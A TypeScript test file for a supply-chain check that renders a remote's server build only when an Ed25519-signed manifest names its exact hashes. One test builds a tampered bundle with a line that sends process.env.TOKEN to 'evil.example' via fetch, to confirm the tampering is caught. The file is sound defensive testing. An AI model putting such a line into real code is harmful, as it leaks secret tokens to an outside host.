import { generateKeyPairSync, sign, type KeyObject } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

import { pinnedKey, prepareRemoteSsr, sri, verifyBuild } from './remote-code';
import { stopRenderer } from './remote-render';

/*
 * The shell renders a remote's server build only when a manifest signed by
 * the key it pins names that build's exact bytes (PEO-115).
 */

const pair = () => generateKeyPairSync('ed25519');
const { publicKey, privateKey } = pair();
const pinned = (key: KeyObject) => key.export({ format: 'der', type: 'spki' }).toString('base64');

const CODE = `exports.Profile = function () { return null; };`;
const CSS = `.p { color: red }`;
const manifestOf = (code: string) =>
  JSON.stringify({ files: { 'people.cjs': sri(code), 'people.css': sri(CSS) } });
const signed = (manifest: string, key = privateKey) =>
  sign(null, Buffer.from(manifest), key).toString('base64');

describe('verifyBuild', () => {
  const key = pinnedKey(pinned(publicKey));
  if (key === undefined) throw new Error('the test key did not parse');

  it('accepts the build its signed manifest names, and hands back the stylesheet hash', () => {
    const manifest = manifestOf(CODE);
    expect(verifyBuild(key, manifest, signed(manifest), CODE)).toEqual({
      ok: true,
      sha: sri(CODE),
      stylesheet: sri(CSS),
    });
  });

  it('refuses a build altered after signing, naming both hashes', () => {
    const manifest = manifestOf(CODE);
    const altered = `${CODE}\nfetch('https://evil.example/' + process.env.TOKEN);`;
    expect(verifyBuild(key, manifest, signed(manifest), altered)).toEqual({
      ok: false,
      reason: 'the server build does not match its manifest',
      expected: sri(CODE),
      actual: sri(altered),
    });
  });

  it('refuses a manifest the host wrote itself, or signed with any other key', () => {
    const forged = manifestOf(`exports.Profile = () => 'mine';`);
    const other = pair().privateKey;
    expect(verifyBuild(key, forged, signed(forged, other), CODE)).toMatchObject({
      ok: false,
      reason: 'the manifest is not signed by the pinned key',
    });
    expect(verifyBuild(key, forged, 'not a signature', CODE)).toMatchObject({ ok: false });
    // Signed, then edited.
    const manifest = manifestOf(CODE);
    expect(
      verifyBuild(key, manifest.replace('sha384', 'sha384 '), signed(manifest), CODE),
    ).toMatchObject({ ok: false, reason: 'the manifest is not signed by the pinned key' });
  });

  it('refuses a signed manifest it cannot read', () => {
    const odd = JSON.stringify({ files: { 'people.cjs': 'md5-abc' } });
    expect(verifyBuild(key, odd, signed(odd), CODE)).toMatchObject({
      ok: false,
      reason: 'the signed manifest is not one the shell reads',
    });
  });

  it('pins only an Ed25519 public key', () => {
    expect(pinnedKey(undefined)).toBeUndefined();
    expect(pinnedKey('')).toBeUndefined();
    expect(pinnedKey('garbage')).toBeUndefined();
    const rsa = generateKeyPairSync('rsa', { modulusLength: 2048 }).publicKey;
    expect(pinnedKey(pinned(rsa))).toBeUndefined();
  });
});

describe('prepareRemoteSsr', () => {
  const files: Record<string, string> = {};
  let server: Server;
  let base: string;

  beforeAll(async () => {
    server = createServer((request, response) => {
      const body = files[request.url ?? ''];
      response.writeHead(body === undefined ? 404 : 200);
      response.end(body);
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const address = server.address();
    if (typeof address !== 'object' || address === null) throw new Error('no port');
    base = `http://127.0.0.1:${String(address.port)}`;
    vi.stubEnv('PEOPLE_REMOTE_SSR_PUBLIC_KEY', pinned(publicKey));
  });

  afterAll(() => {
    vi.unstubAllEnvs();
    server.close();
    // A verified build starts its renderer at once.
    stopRenderer();
  });

  const serve = (code: string, manifest = manifestOf(code)) => {
    files['/ssr/people.cjs'] = code;
    files['/ssr/manifest.json'] = manifest;
    files['/ssr/manifest.json.sig'] = signed(manifest);
  };

  it('keeps a verified build, and links its stylesheet held to the signed hash', async () => {
    serve(CODE);
    expect(await prepareRemoteSsr(base)).toEqual({
      ssr: `${base}/ssr/people.cjs`,
      stylesheet: { href: `${base}/ssr/people.css`, integrity: sri(CSS) },
    });
  });

  it('falls back to the browser for a substituted build, and says so once per build without the code', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const substituted = `exports.Profile = function () { return 'SECRET-LOOKING-CODE'; };`;
    serve(CODE);
    files['/ssr/people.cjs'] = substituted;
    expect(await prepareRemoteSsr(base)).toBeUndefined();
    expect(await prepareRemoteSsr(base)).toBeUndefined();
    expect(warn).toHaveBeenCalledTimes(1);
    const logged = String(warn.mock.calls[0]?.[0]);
    expect(JSON.parse(logged)).toMatchObject({ expected: sri(CODE), actual: sri(substituted) });
    expect(logged).not.toContain('SECRET-LOOKING-CODE');
    warn.mockRestore();
  });

  it('renders nothing on the server without a pinned key', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    vi.stubEnv('PEOPLE_REMOTE_SSR_PUBLIC_KEY', '');
    serve(CODE);
    expect(await prepareRemoteSsr(base)).toBeUndefined();
    vi.stubEnv('PEOPLE_REMOTE_SSR_PUBLIC_KEY', pinned(publicKey));
    warn.mockRestore();
  });
});
